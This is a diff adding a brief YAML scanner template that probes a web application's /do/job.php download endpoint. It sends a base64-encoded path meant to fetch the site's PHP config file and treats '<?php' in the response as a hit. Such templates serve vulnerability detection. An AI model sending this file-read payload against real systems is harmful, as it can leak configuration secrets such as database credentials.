@@ -1,0 +1,6 @@
+request:
+  method: get
+  path: /do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8
+  timeout: 5
+response:
+  hit_content: <?php
